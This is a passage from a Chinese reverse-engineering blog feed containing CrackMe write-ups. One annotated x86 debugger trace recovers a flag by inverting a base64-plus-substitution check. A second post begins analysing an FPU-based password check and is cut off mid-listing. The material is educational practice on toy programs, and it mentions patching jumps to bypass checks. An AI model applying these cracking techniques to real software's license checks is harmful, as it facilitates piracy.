class="line">012411FE | 51                       | push ecx                                 |</div><div class="line">012411FF | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    | base64(你的输入) -&gt; [ebp - 0x40]</div><div class="line">01241207 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">0124120A | 83 C4 08                 | add esp,8                                |</div><div class="line">0124120D | 33 D2                    | xor edx,edx                              |</div><div class="line">0124120F | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">01241212 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</div><div class="line">01241214 | 41                       | inc ecx                                  |</div><div class="line">01241215 | 84 C0                    | test al,al                               |</div><div class="line">01241217 | 75 F9                    | jne reverse3.1241212                     |</div><div class="line">01241219 | 2B CE                    | sub ecx,esi                              | 长度（base64你的输入） -&gt; ecx</div><div class="line">0124121B | 74 37                    | je reverse3.1241254                      |</div><div class="line">0124121D | 0F 1F 00                 | nop dword ptr ds:[eax]                   | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |</div><div class="line">01241224 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         |</div><div class="line">0124122C | 74 08                    | je reverse3.1241236                      |</div><div class="line">0124122E | 40                       | inc eax                                  | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">0124122F | 83 F8 1A                 | cmp eax,1A                               | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">01241232 | 72 F2                    | jb reverse3.1241226                      |</div><div class="line">01241234 | EB 0A                    | jmp reverse3.1241240                     |</div><div class="line">01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         |</div><div class="line">0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |</div><div class="line">01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">01241243 | 42                       | inc edx                                  |</div><div class="line">01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</div><div class="line">01241249 | 41                       | inc ecx                                  |</div><div class="line">0124124A | 84 C0                    | test al,al                               |</div><div class="line">0124124C | 75 F9                    | jne reverse3.1241247                     |</div><div class="line">0124124E | 2B CE                    | sub ecx,esi                              | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">01241250 | 3B D1                    | cmp edx,ecx                              |</div><div class="line">01241252 | 72 CC                    | jb reverse3.1241220                      |</div><div class="line">01241254 | 6A 14                    | push 14                                  |</div><div class="line">01241256 | 8D 45 C0                 | lea eax,dword ptr ss:[ebp-40]            |</div><div class="line">01241259 | 68 40 21 24 01           | push reverse3.1242140                    | 1242140:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</div><div class="line">0124125E | 50                       | push eax                                 | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">0124125F | FF 15 C4 20 24 01        | call dword ptr ds:[&lt;&amp;strncmp&gt;]           | 经过处理的base64与内置base64值比较，相等=&gt;eax=0</div><div class="line">01241265 | 83 C4 0C                 | add esp,C                                |</div><div class="line">01241268 | 5E                       | pop esi                                  | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">01241269 | 85 C0                    | test eax,eax                             | zf=1 =&gt; eax=0</div><div class="line">0124126B | 75 07                    | jne reverse3.1241274                     |</div><div class="line">0124126D | 68 78 21 24 01           | push reverse3.1242178                    | 1242178:&quot;this is the right flag&quot;</div><div class="line">01241272 | EB 05                    | jmp reverse3.1241279                     |</div><div class="line">01241274 | 68 90 21 24 01           | push reverse3.1242190                    | 1242190:&quot;wrong input&quot;</div><div class="line">01241279 | FF 15 B0 20 24 01        | call dword ptr ds:[&lt;&amp;puts&gt;]              |</div><div class="line">0124127F | 8B 4D FC                 | mov ecx,dword ptr ss:[ebp-4]             |</div><div class="line">01241282 | 83 C4 04                 | add esp,4                                |</div><div class="line">01241285 | 33 CD                    | xor ecx,ebp                              |</div><div class="line">01241287 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">01241289 | E8 92 00 00 00           | call reverse3.1241320                    |</div><div class="line">0124128E | 8B E5                    | mov esp,ebp                              |</div><div class="line">01241290 | 5D                       | pop ebp                                  |</div><div class="line">01241291 | C3                       | ret                                      |</div></pre></td></tr></table></figure></p>
<p>看来是这几行做了手脚，压入了两个参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">01241259 | 68 40 21 24 01           | push reverse3.1242140                    | 1242140:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</div><div class="line">0124125E | 50                       | push eax                                 | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">0124125F | FF 15 C4 20 24 01        | call dword ptr ds:[&lt;&amp;strncmp&gt;]           | 经过处理的base64与内置base64值比较，相等=&gt;eax=0</div></pre></td></tr></table></figure></p>
<p>我们跟这个call进去看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">6C2F8C30 | 53                       | push ebx                                 |</div><div class="line">6C2F8C31 | 56                       | push esi                                 | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">6C2F8C32 | 8B 4C 24 0C              | mov ecx,dword ptr ss:[esp+C]             | 我们输入的base64变形后的值</div><div class="line">6C2F8C36 | 8B 54 24 10              | mov edx,dword ptr ss:[esp+10]            | 内置base64值</div><div class="line">6C2F8C3A | 8B 5C 24 14              | mov ebx,dword ptr ss:[esp+14]            |</div><div class="line">6C2F8C3E | F7 C3 FF FF FF FF        | test ebx,FFFFFFFF                        |</div><div class="line">6C2F8C44 | 74 50                    | je ucrtbase.6C2F8C96                     |</div><div class="line">6C2F8C46 | 2B CA                    | sub ecx,edx                              |</div><div class="line">6C2F8C48 | F7 C2 03 00 00 00        | test edx,3                               |</div><div class="line">6C2F8C4E | 74 17                    | je ucrtbase.6C2F8C67                     |</div><div class="line">6C2F8C50 | 0F B6 04 0A              | movzx eax,byte ptr ds:[edx+ecx]          | edx+ecx*1:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C54 | 3A 02                    | cmp al,byte ptr ds:[edx]                 |</div><div class="line">6C2F8C56 | 75 48                    | jne ucrtbase.6C2F8CA0                    |</div><div class="line">6C2F8C58 | 85 C0                    | test eax,eax                             | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C5A | 74 3A                    | je ucrtbase.6C2F8C96                     |</div><div class="line">6C2F8C5C | 42                       | inc edx                                  |</div><div class="line">6C2F8C5D | 83 EB 01                 | sub ebx,1                                |</div><div class="line">6C2F8C60 | 76 34                    | jbe ucrtbase.6C2F8C96                    |</div><div class="line">6C2F8C62 | F6 C2 03                 | test dl,3                                |</div><div class="line">6C2F8C65 | 75 E9                    | jne ucrtbase.6C2F8C50                    |</div><div class="line">6C2F8C67 | 8D 04 0A                 | lea eax,dword ptr ds:[edx+ecx]           | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C6A | 25 FF 0F 00 00           | and eax,FFF                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C6F | 3D FC 0F 00 00           | cmp eax,FFC                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C74 | 77 DA                    | ja ucrtbase.6C2F8C50                     |</div><div class="line">6C2F8C76 | 8B 04 0A                 | mov eax,dword ptr ds:[edx+ecx]           | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C79 | 3B 02                    | cmp eax,dword ptr ds:[edx]               | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C7B | 75 D3                    | jne ucrtbase.6C2F8C50                    |</div><div class="line">6C2F8C7D | 83 EB 04                 | sub ebx,4                                |</div><div class="line">6C2F8C80 | 76 14                    | jbe ucrtbase.6C2F8C96                    |</div><div class="line">6C2F8C82 | 8D B0 FF FE FE FE        | lea esi,dword ptr ds:[eax-1010101]       | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">6C2F8C88 | 83 C2 04                 | add edx,4                                |</div><div class="line">6C2F8C8B | F7 D0                    | not eax                                  | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C8D | 23 C6                    | and eax,esi                              | eax:&quot;OTacMDMzMTI=&quot;, esi:&quot;TacMDMzMTI=&quot;</div><div class="line">6C2F8C8F | A9 80 80 80 80           | test eax,80808080                        | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C94 | 74 D1                    | je ucrtbase.6C2F8C67                     |</div><div class="line">6C2F8C96 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C98 | 5E                       | pop esi                                  | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">6C2F8C99 | 5B                       | pop ebx                                  |</div><div class="line">6C2F8C9A | C3                       | ret                                      |</div><div class="line">6C2F8C9B | EB 03                    | jmp ucrtbase.6C2F8CA0                    |</div><div class="line">6C2F8C9D | CC                       | int3                                     |</div><div class="line">6C2F8C9E | CC                       | int3                                     |</div><div class="line">6C2F8C9F | CC                       | int3                                     |</div><div class="line">6C2F8CA0 | 1B C0                    | sbb eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8CA2 | 83 C8 01                 | or eax,1                                 | eax:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8CA5 | 5E                       | pop esi                                  | esi:&quot;TacMDMzMTI=&quot;</div><div class="line">6C2F8CA6 | 5B                       | pop ebx                                  |</div><div class="line">6C2F8CA7 | C3                       | ret                                      |</div></pre></td></tr></table></figure></p>
<p>这段代码的跳转比较复杂，我们主要看这段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">6C2F8C50 | 0F B6 04 0A              | movzx eax,byte ptr ds:[edx+ecx]          | edx+ecx*1:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C54 | 3A 02                    | cmp al,byte ptr ds:[edx]                 | edx:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</div><div class="line">6C2F8C56 | 75 48                    | jne ucrtbase.6C2F8CA0                    |</div><div class="line">6C2F8C58 | 85 C0                    | test eax,eax                             |</div><div class="line">6C2F8C5A | 74 3A                    | je ucrtbase.6C2F8C96                     |</div><div class="line">6C2F8C5C | 42                       | inc edx                                  | edx:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</div><div class="line">6C2F8C5D | 83 EB 01                 | sub ebx,1                                |</div><div class="line">6C2F8C60 | 76 34                    | jbe ucrtbase.6C2F8C96                    |</div><div class="line">6C2F8C62 | F6 C2 03                 | test dl,3                                |</div><div class="line">6C2F8C65 | 75 E9                    | jne ucrtbase.6C2F8C50                    |</div><div class="line">6C2F8C67 | 8D 04 0A                 | lea eax,dword ptr ds:[edx+ecx]           | edx+ecx*1:&quot;OTacMDMzMTI=&quot;</div><div class="line">6C2F8C6A | 25 FF 0F 00 00           | and eax,FFF                              |</div><div class="line">6C2F8C6F | 3D FC 0F 00 00           | cmp eax,FFC                              |</div><div class="line">6C2F8C74 | 77 DA                    | ja ucrtbase.6C2F8C50                     |</div></pre></td></tr></table></figure></p>
<p>通读可以发现就是把我们输入的base64变形后的值(<code>OTacMDMzMTI=</code>)按字节取出来一一和内置的<code>o2Ffx3V0OjJtYW5spQ==</code>做比较，只有当全部相等才跳到这把eax置零<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">6C2F8C96 | 33 C0                    | xor eax,eax</div></pre></td></tr></table></figure></p>
<p>然后退出函数</p>
<p>那么这个<code>OTacMDMzMTI=</code>是个什么呢？看着是个base64，但是我们解出来是<code>96?3312</code>，完全不是我们输入的<code>97103012</code>了，这个只怎么来的呢？我们继续看这段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">012411FF | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    |base64(你的输入) -&gt; [ebp - 0x40]</div><div class="line">01241207 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">0124120A | 83 C4 08                 | add esp,8                                |</div><div class="line">0124120D | 33 D2                    | xor edx,edx                              | edx:&quot;97103012&quot;</div><div class="line">0124120F | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |</div><div class="line">01241212 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</div><div class="line">01241214 | 41                       | inc ecx                                  |</div><div class="line">01241215 | 84 C0                    | test al,al                               |</div><div class="line">01241217 | 75 F9                    | jne reverse3.1241212                     |</div><div class="line">01241219 | 2B CE                    | sub ecx,esi                              | 长度（base64你的输入） -&gt; ecx</div><div class="line">0124121B | 74 37                    | je reverse3.1241254                      |</div><div class="line">0124121D | 0F 1F 00                 | nop dword ptr ds:[eax]                   |</div><div class="line">01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |</div><div class="line">01241224 | 33 C0                    | xor eax,eax                              |</div><div class="line">01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         | eax+1242108:&quot;abcdefghijklmnopqrstuvwxyz&quot;</div><div class="line">0124122C | 74 08                    | je reverse3.1241236                      |</div><div class="line">0124122E | 40                       | inc eax                                  |</div><div class="line">0124122F | 83 F8 1A                 | cmp eax,1A                               |</div><div class="line">01241232 | 72 F2                    | jb reverse3.1241226                      |</div><div class="line">01241234 | EB 0A                    | jmp reverse3.1241240                     |</div><div class="line">01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         | eax+1242124:&quot;wxabopdefghijklqrstuvyzcmn&quot;</div><div class="line">0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |</div><div class="line">01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">01241243 | 42                       | inc edx                                  | edx:&quot;97103012&quot;</div><div class="line">01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |</div><div class="line">01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</div><div class="line">01241249 | 41                       | inc ecx                                  |</div><div class="line">0124124A | 84 C0                    | test al,al                               |</div><div class="line">0124124C | 75 F9                    | jne reverse3.1241247                     |</div><div class="line">0124124E | 2B CE                    | sub ecx,esi                              |</div><div class="line">01241250 | 3B D1                    | cmp edx,ecx                              | edx:&quot;97103012&quot;</div><div class="line">01241252 | 72 CC                    | jb reverse3.1241220                      |</div><div class="line">01241254 | 6A 14                    | push 14                                  |</div></pre></td></tr></table></figure></p>
<p>下面这行代码有兴趣的可以跟进去看看，其实就是base64编码，苦逼的我傻乎乎地跟完了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    |base64(你的输入) -&gt; [ebp - 0x40]</div></pre></td></tr></table></figure></p>
<p>那<code>97103012</code>的base64是<code>OTcxMDMwMTI=</code>呀，这个<code>OTacMDMzMTI=</code>是怎么来的呢？我们看着一段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |</div><div class="line">01241224 | 33 C0                    | xor eax,eax                              |</div><div class="line">01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         | eax+1242108:&quot;abcdefghijklmnopqrstuvwxyz&quot;</div><div class="line">0124122C | 74 08                    | je reverse3.1241236                      |</div><div class="line">0124122E | 40                       | inc eax                                  |</div><div class="line">0124122F | 83 F8 1A                 | cmp eax,1A                               |</div><div class="line">01241232 | 72 F2                    | jb reverse3.1241226                      |</div><div class="line">01241234 | EB 0A                    | jmp reverse3.1241240                     |</div><div class="line">01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         | eax+1242124:&quot;wxabopdefghijklqrstuvyzcmn&quot;</div><div class="line">0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |</div><div class="line">01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</div><div class="line">01241243 | 42                       | inc edx                                  | edx:&quot;97103012&quot;</div><div class="line">01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |</div><div class="line">01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</div><div class="line">01241249 | 41                       | inc ecx                                  |</div><div class="line">0124124A | 84 C0                    | test al,al                               |</div><div class="line">0124124C | 75 F9                    | jne reverse3.1241247                     |</div><div class="line">0124124E | 2B CE                    | sub ecx,esi                              |</div><div class="line">01241250 | 3B D1                    | cmp edx,ecx                              | edx:&quot;97103012&quot;</div><div class="line">01241252 | 72 CC                    | jb reverse3.1241220                      |</div></pre></td></tr></table></figure></p>
<p>这一段的工作大家跟跟就知道，就是通过一次次循环将<code>OTcxMDMwMTI=</code>中的值通过下面这个对应关系一一置换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">abcdefghijklmnopqrstuvwxyz</div><div class="line">wxabopdefghijklqrstuvyzcmn</div></pre></td></tr></table></figure></p>
<p>所以<code>OTcxMDMwMTI=</code>变成了<code>OTacMDMzMTI=</code>  </p>
<p>好的，我们看到了这里，相信已经知道密码是什么了，也就是我们变形后的base64值要等于<code>o2Ffx3V0OjJtYW5spQ==</code><br>那就倒着置换呗，得出来正确的base64是<code>e2Fib3V0OmJsYW5rfQ==</code>，解码为<code>{about:blank}</code></p>
<p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjpd8arx26j20og0ge0tq.jpg" alt=""></p>
<p><a href="https://pan.baidu.com/s/1mi63WXM" target="_blank" rel="external">例子CM</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说实话，今天被自己蠢哭了  &lt;/p&gt;
&lt;p&gt;因为看多了一个字符，以为是输入字符变形后的base64编码，也怪自己没大致看过base64汇编形式，把base64跟完了用py实现完算法才意思到是base64，这是题外话&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>一个涉及到浮点寄存器的CM</title>
    <link href="http://hacktech.cn/2017/09/18/%E4%B8%80%E4%B8%AA%E6%B6%89%E5%8F%8A%E5%88%B0%E6%B5%AE%E7%82%B9%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84CM.html"/>
    <id>http://hacktech.cn/2017/09/18/一个涉及到浮点寄存器的CM.html</id>
    <published>2017-09-18T12:56:04.000Z</published>
    <updated>2017-09-18T12:58:34.174Z</updated>
    
    <content type="html"><![CDATA[<p>这次找小伙伴要了他的一个CM，怎么说呢，这CM让我学到了不少，其实搞出来后感觉不难，就是有不少FPU浮点相关的指令和FPU寄存器完全没学过，查了不少资料，学到了很多<br><a id="more"></a><br>打开是这样<br><img src="http://ww1.sinaimg.cn/large/c0264382gy1fjo0hr07rpj20bv07qq3v.jpg" alt=""></p>
<p>无壳程序，我们直接od查找字符串，爆破我就不说了，直接改跳转<br>我第一次是找到这个判断的函数开头，一行行快速单步，确实发现了输入，但是后来很多命令不懂意思我也单步，导致看到后来也不知道怎么判断的<br>然后我改了策略，先逆着就近看看，怎么才能使条件成立<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">004010EA  |.  F6C4 41       test ah,0x41                             ;  zf=0 -&gt; ah &amp; 0x41 != 0</div><div class="line">004010ED  |.  B8 00000000   mov eax,0x0</div><div class="line">004010F2  |.  0f95c0        setne al                                 ;  eax=1 -&gt; al=1 -&gt; zf=0</div><div class="line">004010F5  |.  8945 D0       mov [local.12],eax</div><div class="line">004010F8  |.  837D D0 01    cmp [local.12],0x1</div><div class="line">004010FC  |.  0F85 39000000 jnz 测试.0040113B                          ;  要求zf=1，即eax=0x1</div><div class="line">00401102  |.  BB 06000000   mov ebx,0x6</div><div class="line">00401107  |.  E8 F8FEFFFF   call 测试.00401004</div><div class="line">0040110C  |.  68 01030080   push 0x80000301</div><div class="line">00401111  |.  6A 00         push 0x0</div><div class="line">00401113  |.  68 00000000   push 0x0</div><div class="line">00401118  |.  68 04000080   push 0x80000004</div><div class="line">0040111D  |.  6A 00         push 0x0</div><div class="line">0040111F  |.  68 6D1B4800   push 测试.00481B6D                         ;  成功</div><div class="line">00401124  |.  68 04000000   push 0x4</div><div class="line">00401129  |.  BB 90164000   mov ebx,测试.00401690</div><div class="line">0040112E  |.  E8 36010000   call 测试.00401269</div><div class="line">00401133  |.  83C4 34       add esp,0x34</div><div class="line">00401136  |.  E9 34000000   jmp 测试.0040116F</div><div class="line">0040113B  |&gt;  BB 06000000   mov ebx,0x6</div><div class="line">00401140  |.  E8 BFFEFFFF   call 测试.00401004</div><div class="line">00401145  |.  68 01030080   push 0x80000301</div><div class="line">0040114A  |.  6A 00         push 0x0</div><div class="line">0040114C  |.  68 00000000   push 0x0</div><div class="line">00401151  |.  68 04000080   push 0x80000004</div><div class="line">00401156  |.  6A 00         push 0x0</div><div class="line">00401158  |.  68 721B4800   push 测试.00481B72                         ;  失败</div><div class="line">0040115D  |.  68 04000000   push 0x4</div></pre></td></tr></table></figure></p>
<p>也就是说需要找ah相关的<br>接下来我们整体看看，因为第一次接触FPU浮点相关的指令和FPU寄存器，所以注释写的比较繁琐，望大家见谅<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div></pre></td><td class="code"><pre><div class="line">0040100C  /.  55            push ebp</div><div class="line">0040100D  |.  8BEC          mov ebp,esp</div><div class="line">0040100F  |.  81EC 34000000 sub esp,0x34</div><div class="line">00401015  |.  6A FF         push -0x1</div><div class="line">00401017  |.  6A 08         push 0x8</div><div class="line">00401019  |.  68 02000116   push 0x16010002</div><div class="line">0040101E  |.  68 01000152   push 0x52010001</div><div class="line">00401023  |.  E8 47020000   call 测试.0040126F                         ;  执行后   输入的密码 -&gt; eax(1886b8)</div><div class="line">00401028  |.  83C4 10       add esp,0x10</div><div class="line">0040102B  |.  8945 FC       mov [local.1],eax                        ;  eax中你的输入 -&gt; ebp-4</div><div class="line">0040102E  |.  68 04000080   push 0x80000004</div><div class="line">00401033  |.  6A 00         push 0x0</div><div class="line">00401035  |.  8B45 FC       mov eax,[local.1]</div><div class="line">00401038  |.  85C0          test eax,eax</div><div class="line">0040103A  |.  75 05         jnz short 测试.00401041</div><div class="line">0040103C  |.  B8 5C1B4800   mov eax,测试.00481B5C</div><div class="line">00401041  |&gt;  50            push eax</div><div class="line">00401042  |.  68 01000000   push 0x1</div><div class="line">00401047  |.  BB A0134000   mov ebx,测试.004013A0</div><div class="line">0040104C  |.  E8 18020000   call 测试.00401269                         ;  eax=16进制(你的输入)   ecx=0</div><div class="line">00401051  |.  83C4 10       add esp,0x10                             ;  esp = 1000b</div><div class="line">00401054  |.  8945 F8       mov [local.2],eax                        ;  16进制(你的输入) -&gt; local.2</div><div class="line">00401057  |.  8B5D FC       mov ebx,[local.1]                        ;  你的输入 -&gt; ebx</div><div class="line">0040105A  |.  85DB          test ebx,ebx</div><div class="line">0040105C  |.  74 09         je short 测试.00401067</div><div class="line">0040105E  |.  53            push ebx                                 ;  输入压栈 ebp-38  local.14</div><div class="line">0040105F  |.  E8 F9010000   call 测试.0040125D</div><div class="line">00401064  |.  83C4 04       add esp,0x4                              ;  [ebp-38] + 4</div><div class="line">00401067  |&gt;  DB45 F8       fild [local.2]                           ;  十进制浮点(输入) -&gt; st0</div><div class="line">0040106A  |.  DD5D F0       fstp qword ptr ss:[ebp-0x10]             ;  st0 -&gt; ebp-10H</div><div class="line">0040106D  |.  DD45 F0       fld qword ptr ss:[ebp-0x10]              ;  ebp-10 -&gt; st0</div><div class="line">00401070  |.  DC05 5D1B4800 fadd qword ptr ds:[0x481B5D]             ;  st0 = st0 + 520</div><div class="line">00401076  |.  DD5D E8       fstp qword ptr ss:[ebp-0x18]             ;  十进制你的输入+520 -&gt; ebp-18H</div><div class="line">00401079  |.  6A FF         push -0x1</div><div class="line">0040107B  |.  6A 08         push 0x8</div><div class="line">0040107D  |.  68 03000116   push 0x16010003</div><div class="line">00401082  |.  68 01000152   push 0x52010001</div><div class="line">00401087  |.  E8 E3010000   call 测试.0040126F</div><div class="line">0040108C  |.  83C4 10       add esp,0x10</div><div class="line">0040108F  |.  8945 E4       mov [local.7],eax</div><div class="line">00401092  |.  68 04000080   push 0x80000004</div><div class="line">00401097  |.  6A 00         push 0x0</div><div class="line">00401099  |.  8B45 E4       mov eax,[local.7]</div><div class="line">0040109C  |.  85C0          test eax,eax</div><div class="line">0040109E  |.  75 05         jnz short 